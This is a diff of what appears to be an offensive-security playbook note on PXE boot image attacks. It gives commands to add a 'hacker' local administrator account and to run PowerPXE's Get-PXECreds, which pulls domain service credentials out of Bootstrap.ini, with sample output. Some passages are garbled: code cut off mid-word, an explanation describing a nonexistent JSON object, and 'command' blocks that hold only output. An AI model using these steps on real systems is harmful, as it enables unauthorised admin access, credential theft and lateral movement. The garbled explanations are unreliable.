@@ -44,6 +44,8 @@ From a technical standpoint, the attacker would need to create a custom PXE Boot
 
 The business value of this attack is that it allows an attacker to gain access to target machines without needing to know valid domain credentials. This can be useful in situations where domain credentials are tightly controlled or where the attacker has limited access to the target network.
 
+ 
+
 ## Requirements
 
 1. Access to the target network
@@ -51,6 +53,8 @@ The business value of this attack is that it allows an attacker to gain access t
 1. Ability to create custom PXE Boot image and script
 
 1. Knowledge of target machine's MAC address
+
+ 
 
 ## Defense
 
@@ -60,6 +64,8 @@ The business value of this attack is that it allows an attacker to gain access t
 
 1. Monitor for unusual PXE Boot activity on the network
 
+ 
+
 ## Objectives
 
 1. Hijack local administrator accounts on target machines
@@ -67,6 +73,8 @@ The business value of this attack is that it allows an attacker to gain access t
 1. Gain access to target machines without valid domain credentials
 
 1. Move laterally within the target network
+
+ 
 
 # Instructions
 
@@ -77,10 +85,18 @@ net localgroup administrators /add [username]
 
 Replace [username] with the desired username and [password] with the desired password. This will create a new local administrator account on the machine.
 
+ 
+
+
+
 **Code**: [[net user hacker Password123! /add
 net localgroup a]]
 
+
+
 > The 'net user' command is used to create a new user account on the system. The '/add' switch tells the command to add a new user. The 'net localgroup' command is used to manage local groups on the system. The '/add' switch tells the command to add a new member to the group. By adding the new user to the 'administrators' group, we are granting them full administrative privileges on the machine.
+
+
 
 **Command** ([[Create new user and add to administrators group]]):
 
@@ -88,6 +104,8 @@ net localgroup a]]
 net user hacker Password123! /add
 net localgroup administrators /add hacker
 ```
+
+
 
 2. To extract the pre-boot image and find default passwords and domain accounts, follow these steps:
 1. Import the PowerPXE module by running the following command: Import-Module .\PowerPXE.ps1
@@ -101,10 +119,18 @@ net localgroup administrators /add hacker
     b. Find the Bootstrap.ini file
     c. Retrieve the DeployRoot, UserID, and UserPassword values
 
+ 
+
+
+
 **Code**: [[# Import the module
 PS > Import-Module .\PowerPXE.]]
 
+
+
 > This JSON object provides instructions for extracting the pre-boot image and finding default passwords and domain accounts using the PowerPXE.ps1 module. The 'data' field contains the PowerShell commands required to perform the task, while the 'text' field provides a brief summary of the task. The 'instruction' field provides detailed step-by-step instructions for performing the task, while the 'explain' field provides an overview of the JSON object and its purpose. The 'name' field provides a descriptive name for the task.
+
+
 
 **Command** ([[Start PXE exploit on Ethernet interface]]):
 
@@ -112,11 +138,19 @@ PS > Import-Module .\PowerPXE.]]
 Get-PXEcreds -InterfaceAlias Ethernet
 ```
 
+
+
+
+
 **Command** ([[Start PXE exploit on lab 0 interface]]):
 
 ```bash
 Get-PXECreds -InterfaceAlias « lab 0 »
 ```
+
+
+
+
 
 **Command** ([[Get a valid IP address]]):
 
@@ -126,12 +160,20 @@ DHCP Validation: DHCPACK
 IP address configured: 192.168.22.101
 ```
 
+
+
+
+
 **Command** ([[Extract BCD path from DHCP response]]):
 
 ```bash
 BCD File path:  \Tmp\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd
 TFTP IP Address:  192.168.22.3
 ```
+
+
+
+
 
 **Command** ([[Download BCD file and extract WIM files]]):
 
@@ -140,11 +182,19 @@ Launch TFTP download
 Transfer succeeded.
 ```
 
+
+
+
+
 **Command** ([[Parse BCD file]]):
 
 ```bash
 conf.bcd
 ```
+
+
+
+
 
 **Command** ([[Identify WIM files]]):
 
@@ -153,12 +203,20 @@ conf.bcd
 \Boot\x64\Images\LiteTouchPE_x64.wim
 ```
 
+
+
+
+
 **Command** ([[Download WIM files]]):
 
 ```bash
 Launch TFTP download
 Transfer succeeded.
 ```
+
+
+
+
 
 **Command** ([[Find Bootstrap.ini in LiteTouchPE_x86.wim]]):
 
@@ -167,6 +225,8 @@ DeployRoot = \\LAB-MDT\DeploymentShare$
 UserID = MdtService
 UserPassword = Somepass1
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -197,3 +257,5 @@ UserPassword = Somepass1
 
 - [[Active Directory Attacks]]
 - [[PXE Boot image attack]]
+
+
